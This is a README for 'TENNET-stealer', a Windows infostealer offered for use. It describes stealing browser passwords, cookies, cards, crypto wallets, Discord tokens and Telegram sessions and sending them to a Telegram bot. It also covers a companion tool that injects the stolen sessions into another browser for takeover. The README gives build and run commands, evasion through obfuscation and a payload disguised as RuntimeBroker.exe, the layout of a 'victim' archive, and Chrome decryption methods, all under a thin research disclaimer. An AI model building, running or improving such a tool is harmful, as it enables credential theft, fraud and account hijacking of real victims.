# TENNET-stealer

**Windows browser stealer, PRX-style Telegram reporting, and cross-browser session takeover.**

TENNET-stealer discovers and decrypts data from 45+ Chromium and 10+ Gecko browsers, extracts Discord tokens, Telegram Desktop sessions, and interesting local files, then exfiltrates everything to Telegram. **TENNET Takeover** imports the resulting zip into Chrome, Edge, or Brave for session analysis.

> **Authorized security research, penetration testing, and education only.**  
> Unauthorized access to systems or data is illegal. The authors assume no liability for misuse.

---

## Table of contents

- [Features](#features)
- [Project structure](#project-structure)
- [Requirements](#requirements)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
  - [Build the stealer payload](#1-build-the-stealer-payload)
  - [Run the extractor (dev mode)](#2-run-the-extractor-dev-mode)
  - [Build the injector](#3-build-the-injector)
  - [Inject stolen data](#4-inject-stolen-data)
- [Telegram output](#telegram-output)
- [Zip archive layout](#zip-archive-layout)
- [Encryption support](#encryption-support)
- [Troubleshooting](#troubleshooting)
- [Push to GitHub](#push-to-github)
- [License](#license)

---

## Features

### Extraction (`tennet.py`)

| Category | Details |
|----------|---------|
| **Browsers** | Chrome, Edge, Brave, Firefox family, 45+ Chromium variants |
| **Browser data** | Cookies, passwords, credit cards, autofill, history, bookmarks, downloads |
| **Crypto** | 30+ browser wallet extensions + desktop wallets (Exodus, Electrum, etc.) |
| **Discord** | Token extraction from Discord / Canary / PTB + API enrichment |
| **Files** | Scans Downloads, Documents, Desktop for sensitive files |
| **Telegram app** | Desktop `tdata` session files |
| **Reporting** | PRX-style HTML messages to Telegram + full zip |
| **Stealth** | Silent Win32 APIs, in-memory zip, optional obfuscated EXE build |

### Takeover (`takeover.py`)

| Category | Details |
|----------|---------|
| **Import** | Cookies, passwords, cards, autofill, bookmarks, history, wallet vaults |
| **Cross-browser** | Firefox cookies → Edge/Chrome/Brave (any Chromium target) |
| **CDP injection** | Live cookie import via Chrome DevTools Protocol |
| **Portable** | `TennetTakeover.exe` with file picker — no Python on analysis PC |

---

## Project structure

```
TENNET-stealer/
├── tennet.py              # Main stealer / extractor
├── takeover.py            # Zip → browser profile injector
├── builder.py             # Interactive payload builder + obfuscation
├── build_builder.py       # Packages TennetBuilder.exe
├── build_takeover.py      # Packages TennetTakeover.exe
├── requirements.txt       # Python dependencies
├── push_to_github.ps1     # One-shot GitHub publish script
├── .gitignore
└── dist/                  # Built EXEs (created after build)
    ├── TennetBuilder.exe
    ├── RuntimeBroker.exe  # Configured stealer payload
    └── TennetTakeover.exe
```

---

## Requirements

- **OS:** Windows 10 / 11 (64-bit)
- **Python:** 3.10+ (for development and building EXEs)
- **Target browsers:** At least one of Chrome, Edge, or Brave (for takeover)
- **Telegram:** Bot token + chat ID from [@BotFather](https://t.me/BotFather)

---

## Installation

```powershell
git clone https://github.com/YOUR_USER/TENNET-stealer.git
cd TENNET-stealer

python -m venv .venv
.venv\Scripts\activate

pip install -r requirements.txt
```

---

## Configuration

Credentials are **not** stored in source code. Configure at build time:

1. Run `TennetBuilder.exe` (or `python builder.py`)
2. Enter your **Telegram bot token**
3. Enter **chat ID #1** (and optional **#2** for a second recipient)
4. Choose payload EXE name (default: `RuntimeBroker`)

Find your chat ID via [@userinfobot](https://t.me/userinfobot) on Telegram.

---

## Usage

### 1. Build the stealer payload

```powershell
# Package the builder (one time)
python build_builder.py

# Run builder → creates configured payload
dist\TennetBuilder.exe
```

Output: `dist\RuntimeBroker.exe` (or your chosen name)

The builder applies per-build obfuscation (AES-256-GCM config encryption, IOC string hiding, junk code) and compiles a single portable EXE.

### 2. Run the extractor (dev mode)

For local testing without building an EXE, set credentials at the top of `tennet.py`:

```python
TG_TOKEN    = 'your_bot_token'
TG_CHAT_IDS = ['your_chat_id']   # add a second ID as a second list item
```

Then run as Administrator:

```powershell
python tennet.py
```

### 3. Build the injector

```powershell
python build_takeover.py
```

Output: `dist\TennetTakeover.exe`

### 4. Inject stolen data

**GUI (recommended):**

```powershell
dist\TennetTakeover.exe
```

1. File picker → select the zip from Telegram  
2. Choose browser (Edge / Chrome / Brave)  
3. Wait for `DONE` — browser opens with import summary  

**CLI:**

```powershell
python takeover.py "path\to\data.zip" edge
python takeover.py data.zip edge Default -v          # verbose cookie errors
```

**Verify import:**

| Data | Where to check |
|------|----------------|
| Cookie sessions | Links on the summary page in the opened browser |
| Passwords | `edge://settings/passwords` |
| Bookmarks | `Ctrl+Shift+O` |
| History | `Ctrl+H` |
| Wallet vaults | Install wallet extension in import profile, restart |

Import profile path: `%TEMP%\tennet-takeover\<browser>\User Data`

**Clean re-import:**

```powershell
Remove-Item -Recurse -Force "$env:TEMP\tennet-takeover"
```

---

## Telegram output

### HTML reports (PRX-style)

1. **Victim summary** — username, PC name, OS, public IP  
2. **Discord** — token, email, badges, nitro, billing  
3. **Password stealer** — count + top domains  
4. **Cookie stealer** — count per browser  
5. **File stealer** — grabbed file list  
6. **Apps** — Telegram Desktop, wallets  
7. **Full zip** — `username_data.zip`  

### Zip contents

See [Zip archive layout](#zip-archive-layout) below.

---

## Zip archive layout

```
victim_data.zip
├── edge/
│   ├── cookies.json
│   ├── passwords.json
│   ├── credit_cards.json
│   ├── autofill.json
│   ├── history.json
│   ├── bookmarks.json
│   ├── wallets/phantom/...
│   └── google.com.txt          # legacy cookie format
├── firefox/
│   └── cookies.json
├── discord/
│   ├── accounts.json
│   └── tokens.txt
├── files/
│   └── Downloads/somefile.txt
├── telegram_app/
│   └── tdata/...
├── desktop_wallets/
├── system.json
└── user_agents.json
```

---

## Encryption support

| Scheme | Chrome versions | Method |
|--------|-----------------|--------|
| v10/v11 | All Chromium | DPAPI + AES-256-GCM |
| v20 flag 1 | 127–132 | Hardcoded AES key |
| v20 flag 2 | 133–136 | ChaCha20-Poly1305 |
| v20 flag 3 | 137+ | CNG Key Storage + XOR |
| Gecko cookies | Firefox family | Plaintext SQLite |

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| `0 cookies` for Edge in zip | Edge ABE/v20 decrypt failed — run as admin; close browsers first |
| `Passwords: 0` on re-inject | Data already in profile — delete `%TEMP%\tennet-takeover` |
| `Failed to launch browser` | Use default import profile (don't pass `--real-profile`) |
| Builder can't find `tennet.py` | Keep `tennet.py` next to `TennetBuilder.exe` |
| EXE flagged by AV | Expected for PyInstaller + stealer behavior — test in isolated VM only |
| Git push fails | Install Git + `gh auth login`, run `.\push_to_github.ps1` |

---

## Push to GitHub

```powershell
# Install Git + GitHub CLI first, then:
cd TENNET-stealer
.\push_to_github.ps1
```

Or manually:

```powershell
git init
git add .
git commit -m "Initial commit: TENNET-stealer"
gh repo create TENNET-stealer --private --source=. --push
```

Use a **private** repository.

---

## License

MIT License — see [LICENSE](LICENSE) if included, otherwise use at your own risk under the disclaimer above.
